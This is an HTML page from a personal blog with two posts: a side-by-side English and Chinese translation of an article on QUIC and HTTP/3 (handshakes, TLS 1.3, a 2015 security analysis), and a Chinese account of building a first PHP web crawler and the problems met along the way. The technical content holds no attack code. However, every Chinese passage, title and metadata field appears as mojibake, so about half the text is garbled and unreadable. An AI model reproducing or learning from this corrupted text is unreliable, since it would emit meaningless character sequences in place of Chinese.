  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/ç¿»è¯‘/the-internet-changes-http-3-will-not-use-tcp-anymore/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="jani">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/img/12641322.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ç®€æ°çš„ Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/ç¿»è¯‘/the-internet-changes-http-3-will-not-use-tcp-anymore/" itemprop="url">The Internet changes: HTTP/3 will not use TCP anymore(å› ç‰¹ç½‘å˜æ›´ï¼šHTTP/3 å°†ä¸å†ä½¿ç”¨ TCP)</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-04-14T11:02:24+08:00">
                2019-04-14
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ç¿»è¯‘/" itemprop="url" rel="index">
                    <span itemprop="name">ç¿»è¯‘</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/ç¿»è¯‘/the-internet-changes-http-3-will-not-use-tcp-anymore/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/ç¿»è¯‘/the-internet-changes-http-3-will-not-use-tcp-anymore/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="QUIC-is-the-protocol-underlying-the-next-version-of-HTTP"><a href="#QUIC-is-the-protocol-underlying-the-next-version-of-HTTP" class="headerlink" title="QUIC is the protocol underlying the next version of HTTP"></a>QUIC is the protocol underlying the next version of HTTP</h2><h2 id="QUIC-æ˜¯ä¸‹ä¸€ä¸ªç‰ˆæœ¬-HTTP-çš„åŸºç¡€åè®®"><a href="#QUIC-æ˜¯ä¸‹ä¸€ä¸ªç‰ˆæœ¬-HTTP-çš„åŸºç¡€åè®®" class="headerlink" title="QUIC æ˜¯ä¸‹ä¸€ä¸ªç‰ˆæœ¬ HTTP çš„åŸºç¡€åè®®"></a>QUIC æ˜¯ä¸‹ä¸€ä¸ªç‰ˆæœ¬ HTTP çš„åŸºç¡€åè®®</h2><p>the Internet Engineering Task Force (<strong>IETF</strong>) has revealed that the third official version of HyperText Transfer Protocol (HTTP) <strong>will not use TCP anymore</strong>. Instead, it will run over the QUIC protocol first developed by Google back in 2012.</p>
<p>å› ç‰¹ç½‘å·¥ç¨‹å·¥ä½œç»„ï¼ˆInternet Engineering Task Force ç®€ç§°ï¼š<strong>IETF</strong>ï¼‰é€éœ²ï¼Œç¬¬ä¸‰ä¸ªå®˜æ–¹ç‰ˆæœ¬çš„è¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼ˆHyperText Transfer Protocol ç®€ç§°ï¼šHTTPï¼‰<strong>å°†ä¸å†ä½¿ç”¨ TCP</strong>ã€‚åè€Œï¼Œå®ƒå°†è¿è¡Œ 2012 å¹´ç”±è°·æ­Œé¦–æ¬¡å¼€å‘çš„ QUIC åè®®ã€‚</p>
<h2 id="WHAT-IS-QUIC"><a href="#WHAT-IS-QUIC" class="headerlink" title="WHAT IS QUIC?"></a>WHAT IS QUIC?</h2><h2 id="ä»€ä¹ˆæ˜¯-QUICï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-QUICï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ QUICï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ QUICï¼Ÿ</h2><p><strong>Quick UDP Internet Connections (QUIC)</strong> is, as its name states, a transport layer protocol based on multiplexed UDP connections. In fact, QUIC uses a combination of TCP + TLS + SPDY over UDP with several enhancements with respect to the current HTTP/2 over TCP implementation.</p>
<p><strong>å¿«é€Ÿ UDP å› ç‰¹ç½‘è¿æ¥ï¼ˆQuick UDP Internet Connections ç®€ç§°ï¼šQUICï¼‰</strong> æ˜¯ä¸€ç§åŸºäºå¤šè·¯å¤ç”¨çš„ UDP è¿æ¥çš„ä¼ è¾“å±‚åè®®ã€‚äº‹å®ä¸Šï¼ŒQUIC ä½¿ç”¨äº† TCP + TLS + SPDY over UDP ä¸å½“å‰ HTTP/2 over TCP å®ç°çš„å‡ ä¸ªå¢å¼ºåŠŸèƒ½çš„ç»„åˆã€‚</p>
<p>The <strong>IETF has been working on a standardized version of Googleâ€™s QUIC</strong> since 2016, and it was recently that they announced their intention to include it for the new HTTP/3 version. However, the IETF QUIC version already diverged significantly from the original QUIC design.</p>
<p>IETF è‡ª 2016 å¹´ä»¥æ¥ä¸€ç›´è‡´åŠ›äºå¼€å‘æ ‡å‡†åŒ–çš„ Google QUIC ç‰ˆæœ¬ï¼Œæœ€è¿‘ä»–ä»¬å®£å¸ƒæ‰“ç®—å°†å…¶ç”¨äºæ–°çš„ HTTP/3 ç‰ˆæœ¬ã€‚ç„¶è€Œï¼ŒIETF çš„ QUIC ç‰ˆæœ¬å·²ç»ä¸åŸæ¥çš„ QUIC è®¾è®¡æœ‰äº†å¾ˆå¤§çš„ä¸åŒã€‚</p>
<p><img src="/img/review/1_E90CoPNTa24ekQ85LEyrgg.png" alt><br>Position of HTTP/3 and QUIC in the protocol stack<br>HTTP/3 å’Œ QUIC åœ¨åè®®æ ˆä¸­çš„ä½ç½®</p>
<p>QUIC protocol aims for <strong>simplicity and speed while maintaining security</strong> thanks to the TLS 1.3 encryption. They developed a more efficient protocol in terms of connection establishment and data transfer. <a href="https://docs.google.com/document/d/1gY9-YNDNAB1eip-RTPbqphgySwSNSDHLq9D5Bty4FSU/edit" target="_blank" rel="noopener">According to Google</a>, <strong>QUIC handshakes frequently require zero roundtrips</strong> before sending payload, as compared to 1â€“3 roundtrips for TCP+TLS. Actually, the first connection ever requires one roundtrip and the followings will work with zero.</p>
<p>ç”±äºé‡‡ç”¨äº† TLS 1.3 åŠ å¯†ï¼ŒQUIC åè®®æ—¨åœ¨ç®€åŒ–å’Œæé«˜é€Ÿåº¦ï¼ŒåŒæ—¶ä¿æŒå®‰å…¨æ€§ã€‚ä»–ä»¬åœ¨å»ºç«‹è¿æ¥å’Œæ•°æ®ä¼ è¾“æ–¹é¢å¼€å‘äº†ä¸€ç§æ›´æœ‰æ•ˆçš„åè®®ã€‚<a href="https://docs.google.com/document/d/1gY9-YNDNAB1eip-RTPbqphgySwSNSDHLq9D5Bty4FSU/edit" target="_blank" rel="noopener">æ®è°·æ­Œç§°</a>ï¼Œä¸ TCP + TLS çš„ 1-3 æ¬¡å¾€è¿”ç›¸æ¯”ï¼ŒQuicæ¡æ‰‹åœ¨å‘é€æœ‰æ•ˆè´Ÿè½½ä¹‹å‰é€šå¸¸éœ€è¦<strong>0æ¬¡å¾€è¿”</strong>ã€‚å®é™…ä¸Šï¼Œç¬¬ä¸€æ¬¡è¿æ¥éœ€è¦ä¸€æ¬¡å¾€è¿”ï¼Œä¸‹é¢çš„å†…å®¹å°†ä¸å¾€è¿”ã€‚</p>
<p>Furthermore, it <strong>deals better with packet loss than the current TCP</strong>. Every retransmitted packet consumes a new sequence number, hence eliminating ambiguities and preventing losses from causing RTO. As <a href="https://docs.google.com/presentation/d/15e1bLKYeN56GL1oTJSF9OZiUsI-rcxisLo9dEyDkWQs/edit#slide=id.g5b4208ab1_0_272" target="_blank" rel="noopener">Jana Iyengar from IETF</a> states, QUIC is not only a redefinition of the Internet transport layer but a <strong>reinvention to do the transport right</strong>.</p>
<p>æ­¤å¤–ï¼Œå®ƒ<strong>æ¯”å½“å‰çš„ TCP æ›´èƒ½å¤„ç†æ•°æ®åŒ…ä¸¢å¤±</strong>ã€‚æ¯ä¸€ä¸ªé‡æ–°ä¼ è¾“çš„åŒ…éƒ½ä¼šæ¶ˆè€—ä¸€ä¸ªæ–°çš„åºåˆ—å·ï¼Œå› æ­¤æ¶ˆé™¤äº†æ¨¡ç³Šæ€§ï¼Œå¹¶é˜²æ­¢äº†é€ æˆ RTO çš„æŸå¤±ã€‚æ­£å¦‚<a href="https://docs.google.com/presentation/d/15e1bLKYeN56GL1oTJSF9OZiUsI-rcxisLo9dEyDkWQs/edit#slide=id.g5b4208ab1_0_272" target="_blank" rel="noopener">æ¥è‡ª IETF çš„ Jana Iyengar</a> æ‰€è¯´ï¼ŒQUIC ä¸ä»…æ˜¯å¯¹äº’è”ç½‘ä¼ è¾“å±‚çš„é‡æ–°å®šä¹‰ï¼Œè€Œä¸”æ˜¯å¯¹å®ç°ä¼ è¾“æƒçš„é‡æ–°å®šä¹‰ã€‚</p>
<p>At the moment, only 1.2 % of the top websites support <a href="https://w3techs.com/technologies/details/ce-quic/all/all" target="_blank" rel="noopener">QUIC</a>, but they are generally high-traffic sites: almost every Google service supports their own QUIC protocol.</p>
<p>ç›®å‰ï¼Œåªæœ‰ 1.2% çš„é¡¶çº§ç½‘ç«™æ”¯æŒ QUICï¼Œä½†å®ƒä»¬é€šå¸¸æ˜¯é«˜æµé‡çš„ç½‘ç«™ï¼šå‡ ä¹æ¯ä¸ªè°·æ­ŒæœåŠ¡éƒ½æ”¯æŒè‡ªå·±çš„ QUIC åè®®ã€‚</p>
<h2 id="IS-QUIC-SECURE"><a href="#IS-QUIC-SECURE" class="headerlink" title="IS QUIC SECURE?"></a>IS QUIC SECURE?</h2><h2 id="QUIC-æ˜¯å®‰å…¨çš„ï¼Ÿ"><a href="#QUIC-æ˜¯å®‰å…¨çš„ï¼Ÿ" class="headerlink" title="QUIC æ˜¯å®‰å…¨çš„ï¼Ÿ"></a>QUIC æ˜¯å®‰å…¨çš„ï¼Ÿ</h2><p>QUIC first development included its own encryption. However, it was just a temporary implementation destined to be replaced by <strong>TLS 1.3 as described by the IETF</strong>.</p>
<p>QUIC çš„ç¬¬ä¸€ä¸ªå¼€å‘åŒ…æ‹¬å®ƒè‡ªå·±çš„åŠ å¯†ã€‚ç„¶è€Œï¼Œæ­£å¦‚ IETF æ‰€æè¿°çš„ï¼Œå®ƒåªæ˜¯ä¸€ä¸ªä¸´æ—¶çš„å®ç°ï¼Œæ³¨å®šè¦è¢« TLS 1.3 æ‰€å–ä»£ã€‚</p>
<p>Actually, the connection establishment strategy of QUIC is based on the combination of crypto and transport handshake.</p>
<p>å®é™…ä¸Šï¼ŒQUIC çš„è¿æ¥å»ºç«‹ç­–ç•¥æ˜¯åŸºäºåŠ å¯†å’Œä¼ è¾“æ¡æ‰‹çš„ç»“åˆã€‚</p>
<blockquote>
<p>QUIC relies on a combined cryptographic and transport handshake to minimize connection establishment latency.</p>
<p>QUIC ä¾èµ–äºå¯†ç å’Œä¼ è¾“æ¡æ‰‹çš„ç»„åˆï¼Œä»¥æœ€å°åŒ–è¿æ¥å»ºç«‹å»¶è¿Ÿã€‚</p>
</blockquote>
<p><img src="/img/review/1_cWUBE5wABDOeBZvajVy0eQ.png" alt><br>Integration of QUIC and TLS, adapted from the IETFâ€™s draft of â€œUsing Transport Layer Security (TLS) to Secure QUICâ€.<br>QUIC å’Œ TLS çš„é›†æˆï¼Œæ”¹ç¼–è‡ª IETF çš„ â€œä½¿ç”¨ä¼ è¾“å±‚å®‰å…¨æ€§ï¼ˆTransport Layer Security ç®€ç§°ï¼šTLSï¼‰ä¿æŠ¤ QUICâ€ è‰æ¡ˆã€‚</p>
<p>With QUIC, Everything will be encrypted by default. Nevertheless, there are indeed <strong>security risks</strong> with QUIC as with any other technology.</p>
<p>ä½¿ç”¨ QUICï¼Œé»˜è®¤æƒ…å†µä¸‹å°†åŠ å¯†æ‰€æœ‰å†…å®¹ã€‚ç„¶è€Œï¼Œä¸å…¶ä»–æŠ€æœ¯ä¸€æ ·ï¼ŒQUIC ç¡®å®å­˜åœ¨<strong>å®‰å…¨é£é™©</strong>ã€‚</p>
<p>The work of <a href="https://www.cc.gatech.edu/~aboldyre/papers/quic.pdf" target="_blank" rel="noopener">Robert Lychev and Samuel Jero</a> in 2015 reported several weaknesses of the protocol. QUIC <strong>performance can be degraded by attacks</strong> like the Server Config Replay Attack. However, <strong>the confidentiality and the authenticity of the data seem to be properly secured</strong> according to their security model and tests.</p>
<p><a href="https://www.cc.gatech.edu/~aboldyre/papers/quic.pdf" target="_blank" rel="noopener">Robert Lychev å’Œ Samuel Jero</a> åœ¨ 2015 å¹´çš„ç ”ç©¶æŠ¥å‘Šäº†è¯¥åè®®çš„å‡ ä¸ªå¼±ç‚¹ã€‚åƒæœåŠ¡å™¨é…ç½®é‡æ”¾æ”»å‡»è¿™æ ·çš„æ”»å‡»ä¼š<strong>é™ä½ QUIC æ€§èƒ½</strong>ã€‚ç„¶è€Œï¼Œæ ¹æ®å®‰å…¨æ¨¡å‹å’Œæµ‹è¯•ï¼Œæ•°æ®çš„æœºå¯†æ€§å’ŒçœŸå®æ€§ä¼¼ä¹å¾—åˆ°äº†é€‚å½“çš„ä¿æŠ¤ã€‚</p>
<p><a href="https://medium.com/drill/understanding-event-driven-architectures-eda-the-paradigm-of-the-future-7ae632f056bb" target="_blank" rel="noopener">Understanding Event-Driven Architectures (EDA): the paradigm of the future</a></p>
<p><a href="https://medium.com/drill/understanding-event-driven-architectures-eda-the-paradigm-of-the-future-7ae632f056bb" target="_blank" rel="noopener">ç†è§£äº‹ä»¶é©±åŠ¨çš„architecturesï¼ˆEDAï¼‰ï¼šâ€œèŒƒå¼â€</a></p>
<p><a href="https://medium.com/drill/btc-case-study-applying-basic-digital-signal-processing-into-financial-data-ec34cd47c77b" target="_blank" rel="noopener">BITCOIN case study: applying basic Digital Signal Processing into financial data</a></p>
<p><a href="https://medium.com/drill/btc-case-study-applying-basic-digital-signal-processing-into-financial-data-ec34cd47c77b" target="_blank" rel="noopener">BITCOIN æ¡ˆä¾‹ç ”ç©¶ï¼šå°†åŸºæœ¬æ•°å­—ä¿¡å·å¤„ç†åº”ç”¨äºé‡‘èæ•°æ®</a></p>
<p>If you want to learn more about QUIC and how it will be integrated into the next version of HTTP, I strongly recommend you to check the official documentation from Google and the drafts published by IETF. You can find them in the bibliography of this article!</p>
<p>å¦‚æœæ‚¨æƒ³äº†è§£æ›´å¤šå…³äº QUIC çš„ä¿¡æ¯ï¼Œä»¥åŠå¦‚ä½•å°†å…¶é›†æˆåˆ°ä¸‹ä¸€ä¸ª HTTP ç‰ˆæœ¬ä¸­ï¼Œæˆ‘å¼ºçƒˆå»ºè®®æ‚¨æŸ¥çœ‹æ¥è‡ª Google çš„å®˜æ–¹æ–‡æ¡£å’Œ IETF å‘å¸ƒçš„è‰ç¨¿ã€‚ä½ å¯ä»¥åœ¨è¿™ç¯‡æ–‡ç« çš„å‚è€ƒä¹¦ç›®ä¸­æ‰¾åˆ°å®ƒä»¬ï¼</p>
<p>Innovation is always spinning forward. Just like a Drill.</p>
<p>åˆ›æ–°æ€»æ˜¯å‘å‰æ—‹è½¬ã€‚å°±åƒä¸€ä¸ªç»ƒä¹ ã€‚</p>
<h2 id="BIBLIOGRAPHY"><a href="#BIBLIOGRAPHY" class="headerlink" title="BIBLIOGRAPHY"></a>BIBLIOGRAPHY</h2><h2 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h2><p>[1] â€QUIC, a multiplexed stream transport over UDPâ€Šâ€”â€ŠThe Chromium Projectsâ€, Chromium.org. [Online]. Available: <a href="https://www.chromium.org/quic" target="_blank" rel="noopener">https://www.chromium.org/quic</a>. [Accessed: 18- Nov- 2018]</p>
<p>[2] M. Thomson, â€œdraft-ietf-quic-transport-16â€Šâ€”â€ŠQUIC: A UDP-Based Multiplexed and Secure Transportâ€, Tools.ietf.org, 2018. [Online]. Available: <a href="https://tools.ietf.org/html/draft-ietf-quic-transport-16" target="_blank" rel="noopener">https://tools.ietf.org/html/draft-ietf-quic-transport-16</a>. [Accessed: 18- Nov- 2018]</p>
<p>[3] S. Turner, â€œdraft-ietf-quic-tls-03â€Šâ€”â€ŠUsing Transport Layer Security (TLS) to Secure QUICâ€, Tools.ietf.org, 2018. [Online]. Available: <a href="https://tools.ietf.org/html/draft-ietf-quic-tls-03#section-3" target="_blank" rel="noopener">https://tools.ietf.org/html/draft-ietf-quic-tls-03#section-3</a>. [Accessed: 18- Nov- 2018]</p>
<p>[4] E. Rescorla, â€œThe Transport Layer Security (TLS) Protocol Version 1.3â€, Tools.ietf.org, 2018. [Online]. Available: <a href="https://tools.ietf.org/id/draft-ietf-tls-tls13-23.html" target="_blank" rel="noopener">https://tools.ietf.org/id/draft-ietf-tls-tls13-23.html</a>. [Accessed: 18- Nov- 2018]</p>
<p>[5] R. Lychev, S. Jero, A. Boldyreva and C. Nita-Rotaru, â€œHow Secure and Quick is QUIC? Provable Security and Performance Analysesâ€, 2015. [Online]. Available: <a href="https://www.cc.gatech.edu/~aboldyre/papers/quic.pdf" target="_blank" rel="noopener">https://www.cc.gatech.edu/~aboldyre/papers/quic.pdf</a>. [Accessed: 18- Nov- 2018]</p>
<p>Nov 18, 2018 ï¼ˆ2018-11-18ï¼‰</p>
<p>author: Telmo Subira Rodriguez</p>
<p>link: <a href="https://medium.com/drill/the-internet-changes-http-3-will-not-use-tcp-anymore-427e82eeadc0" target="_blank" rel="noopener">https://medium.com/drill/the-internet-changes-http-3-will-not-use-tcp-anymore-427e82eeadc0</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/å›å¿†å½•/å›æƒ³è‡ªå·±ç¬¬ä¸€æ¬¡å†™çˆ¬è™«çš„ç»å†/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="jani">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/img/12641322.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ç®€æ°çš„ Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/å›å¿†å½•/å›æƒ³è‡ªå·±ç¬¬ä¸€æ¬¡å†™çˆ¬è™«çš„ç»å†/" itemprop="url">å›æƒ³è‡ªå·±ç¬¬ä¸€æ¬¡å†™çˆ¬è™«çš„ç»å†</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-04-13T17:56:34+08:00">
                2019-04-13
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/å›å¿†å½•/" itemprop="url" rel="index">
                    <span itemprop="name">å›å¿†å½•</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/å›å¿†å½•/å›æƒ³è‡ªå·±ç¬¬ä¸€æ¬¡å†™çˆ¬è™«çš„ç»å†/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/å›å¿†å½•/å›æƒ³è‡ªå·±ç¬¬ä¸€æ¬¡å†™çˆ¬è™«çš„ç»å†/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="èµ·å› "><a href="#èµ·å› " class="headerlink" title="èµ·å› "></a>èµ·å› </h2><p>ç¬¬ä¸€æ¬¡çˆ¬è™«æ˜¯å› ä¸ºè§‰å¾—ä¸Šç­ä¸å¿™ï¼Œåˆä¸æƒ³æ¯å¤©ç©æ¸¸æˆè®©è‡ªå·±åæ‚”ã€‚æ‰€ä»¥ä»¥é”»ç‚¼ä¸ºç›®çš„å†™çˆ¬è™«ã€‚å› ä¸ºè‡ªå·±å°¿æ€§æ˜¯æ²¡æœ‰æ¯…åŠ›ä¹Ÿå¾ˆå®¹æ˜“æ”¾å¼ƒçš„äººã€‚æ‰€ä»¥æˆ‘é€‰æ‹©çš„å†…å®¹æ˜¯æŠ“å°ç½‘ç«™ï¼Œè®©è‡ªå·±çš„å­¦ä¹ ä¸ä¼šå¤ªè¿‡äºå›°éš¾ã€‚é‚£æ—¶å¹¶æ²¡æœ‰å¾ˆå¤šå¼€å‘ç»éªŒï¼Œä¹Ÿæ²¡æœ‰åšæ‰€è°“çš„å¯åŠ¨å‡†å¤‡ã€‚éƒ½æ˜¯æƒ³åˆ°ä»€ä¹ˆå°±å»åšä»€ä¹ˆï¼Œä¹Ÿä¸çŸ¥é“è‡ªå·±è¿™ä¸ªé¡¹ç›®è¦åšåˆ°ä»€ä¹ˆç¨‹åº¦ã€‚</p>
<h2 id="å®ç°ç»è¿‡"><a href="#å®ç°ç»è¿‡" class="headerlink" title="å®ç°ç»è¿‡"></a>å®ç°ç»è¿‡</h2><p>æˆ‘çš„æƒ³æ³•å¾ˆç®€å•ï¼Œå–å¾—ç½‘é¡µï¼ŒåŒ¹é…ç½‘é¡µæƒ³è¦çš„å†…å®¹å¹¶ä¿å­˜èµ·æ¥ã€‚å› ä¸ºæŠ€èƒ½é—®é¢˜ï¼Œæˆ‘æ²¡æœ‰ä½¿ç”¨ python æ¥æŠ“å–ã€‚æˆ‘ç”¨çš„æ˜¯ phpã€‚</p>
<p>æœ€å¼€å§‹ï¼Œæˆ‘ä½¿ç”¨ file_get_content() å‡½æ•°æ¥å–å¾—ç½‘é¡µï¼Œç„¶åç”¨æ­£åˆ™åŒ¹é…æ¥åŒ¹é…å†…å®¹ï¼Œä½†æ˜¯é‚£å¤ªæ…¢äº†ï¼Œç„¶åæˆ‘å°±å»æœäº†ä¸€ä¸‹ï¼Œä½¿ç”¨äº† curl å‡½æ•°æ¥ä»£æ›¿äº† file_get_contentã€‚</p>
<p>æˆ‘æŠ“å–çš„ç½‘ç«™æœ‰ä¸‰ç§å†…å®¹ï¼šæ–‡ç« ã€å›¾ç»„å’Œè§†é¢‘</p>
<p>æ–‡ç« åªéœ€è¦æŠ“å–ç½‘é¡µå°±å¯ä»¥å–å¾—å†…å®¹äº†ã€‚ä½†æ˜¯å›¾ç»„ä¸ä½†è¦å–å¾—ç½‘é¡µï¼Œè¿˜è¦åŒ¹é…åˆ°çš„å›¾ç‰‡ä¸‹è½½åˆ°æœ¬åœ°ä¸­ã€‚å½“æ—¶å®Œå…¨å°±æ˜¯å†™ä¸€ä¸ªè„šæœ¬æ–‡ä»¶ï¼Œç„¶åå°±æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘åˆ†æˆä¸¤æ­¥è„šæœ¬è¿›è¡Œå¤„ç†ã€‚ä½†æ˜¯æ€»æ˜¯è¢«å¤§å¤§å°å°çš„é—®é¢˜å¡å¾€ã€‚åé¢ä¹Ÿåªåšäº†æ–‡ç« å’Œå›¾ç»„çš„æŠ“å–ï¼Œä¹Ÿæ²¡æœ‰æ•´ç†ç»´æŠ¤äº†ã€‚</p>
<h2 id="ç¢°åˆ°çš„é—®é¢˜"><a href="#ç¢°åˆ°çš„é—®é¢˜" class="headerlink" title="ç¢°åˆ°çš„é—®é¢˜"></a>ç¢°åˆ°çš„é—®é¢˜</h2><h3 id="å­—ç¬¦ç¼–ç "><a href="#å­—ç¬¦ç¼–ç " class="headerlink" title="å­—ç¬¦ç¼–ç "></a>å­—ç¬¦ç¼–ç </h3><p>å› ä¸ºæœ‰äº›æ–‡ç« å¹¶ä¸æ˜¯ä½¿ç”¨ utf-8 ç¼–ç ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡ mb_detect_encoding å‡½æ•°æ£€æŸ¥ç½‘é¡µçš„å­—ç¬¦ç¼–ç å¹¶ç”¨ iconv å‡½æ•°è½¬æˆ utf-8 çš„æ ¼å¼ã€‚</p>
<h3 id="å†…å­˜å ç”¨è¶Šè¿‡äº†-php-ini-çš„é™åˆ¶ï¼Œå¯¼è‡´æŠ¥å¼‚å¸¸ç¨‹åºä¸­æ–­"><a href="#å†…å­˜å ç”¨è¶Šè¿‡äº†-php-ini-çš„é™åˆ¶ï¼Œå¯¼è‡´æŠ¥å¼‚å¸¸ç¨‹åºä¸­æ–­" class="headerlink" title="å†…å­˜å ç”¨è¶Šè¿‡äº† php.ini çš„é™åˆ¶ï¼Œå¯¼è‡´æŠ¥å¼‚å¸¸ç¨‹åºä¸­æ–­"></a>å†…å­˜å ç”¨è¶Šè¿‡äº† php.ini çš„é™åˆ¶ï¼Œå¯¼è‡´æŠ¥å¼‚å¸¸ç¨‹åºä¸­æ–­</h3><p>æœ€å¼€å§‹æˆ‘çš„æƒ³æ³•æ˜¯æŠŠæ‰€æœ‰å¾—åˆ°çš„å†…å®¹å…ˆå­˜æ”¾åœ¨å˜é‡ä¸­ï¼Œåˆ°ç»“æŸåå†è¿›è¡Œä¸€äº›æ€§ä¿å­˜ï¼Œæ‰€ä»¥å¯¼è‡´å˜é‡å­˜äº†å¤ªå¤šæ•°æ®</p>
<h3 id="èµ„æºé‡å¤"><a href="#èµ„æºé‡å¤" class="headerlink" title="èµ„æºé‡å¤"></a>èµ„æºé‡å¤</h3><p>ç¼–ç æ—¶æ²¡æœ‰è€ƒè™‘åˆ°è„šæœ¬ä¸­æ–­çš„æƒ…å†µï¼Œæ¯æ¬¡éƒ½æ˜¯ä»å¤´å¼€å§‹ã€‚è¿˜æœ‰ä¸€äº›å›¾ç»„èµ„æºæ˜¯æœ¬æ¥å°±æ˜¯é‡å¤çš„ï¼Œ</p>
<h3 id="è„šæœ¬è¿è¡Œå¡æ­»"><a href="#è„šæœ¬è¿è¡Œå¡æ­»" class="headerlink" title="è„šæœ¬è¿è¡Œå¡æ­»"></a>è„šæœ¬è¿è¡Œå¡æ­»</h3><p>ä¸‹è½½æ—¶æœ‰ç½‘ç»œæ³¢åŠ¨ã€ç”µè„‘ä¼‘çœ éƒ½ä¼šå¯¼è‡´å¡æ­»ã€‚è¿™ç§æƒ…å†µè¦ä¹ˆå°±æƒ³åŠæ³•å¤„ç†ç½‘ç»œæ³¢åŠ¨å’Œç”µè„‘çš„é—®é¢˜ï¼Œè¦ä¹ˆå°±åšä¸€äº›ä¸­æ–­å‘½ä»¤åé‡æ–°è¿è¡Œä¼šæ¥ç€æ‰§è¡Œçš„æ“ä½œã€‚</p>
<h3 id="æ•°æ®ä¸¢å¤±"><a href="#æ•°æ®ä¸¢å¤±" class="headerlink" title="æ•°æ®ä¸¢å¤±"></a>æ•°æ®ä¸¢å¤±</h3><p>æ–‡ç« å†…å®¹å­˜åœ¨æ•°æ®åº“ï¼Œä½¿ç”¨çš„æ˜¯ text ç±»å‹å­—æ®µï¼Œä½†æ˜¯æŠ“å–çš„å†…å®¹è¶…è¿‡äº†èŒƒå›´å¯¼è‡´å†…å®¹é—å¤±ã€‚å¯ä»¥æœ‰ä»¥ä¸‹ 2 ç§åŠæ³•å»è§£å†³è¿™ç§é—®é¢˜ã€‚</p>
<ol>
<li>è®¾ç½®åˆé€‚çš„å­—æ®µ</li>
<li>åˆ‡æ¢ä¸€ç§å†…å®¹å­˜å‚¨æ–¹å¼ï¼Œå¦‚å­˜æˆæ–‡ä»¶</li>
</ol>
<h2 id="æ‰©å±•æ€è€ƒ"><a href="#æ‰©å±•æ€è€ƒ" class="headerlink" title="æ‰©å±•æ€è€ƒ"></a>æ‰©å±•æ€è€ƒ</h2><h3 id="æ¨¡æ‹Ÿç™»å½•"><a href="#æ¨¡æ‹Ÿç™»å½•" class="headerlink" title="æ¨¡æ‹Ÿç™»å½•"></a>æ¨¡æ‹Ÿç™»å½•</h3><p>è¿™é‡Œæ¶‰åŠåˆ° session åŸç†ã€‚ä¼ ç»Ÿçš„ç½‘ç«™ä¸€èˆ¬éƒ½ä½¿ç”¨ session åŸç†æ¥å®ç°ç™»å½•ç»‘å®šã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æŠŠç™»å½•æˆåŠŸåçš„æ‰€æœ‰ cookie å¸¦ä¸Šï¼Œå¹¶å…è®¸ cookie æ”¹å˜å³å¯ã€‚ curl å¯ä»¥è¿›è¡Œè®¾ç½®</p>
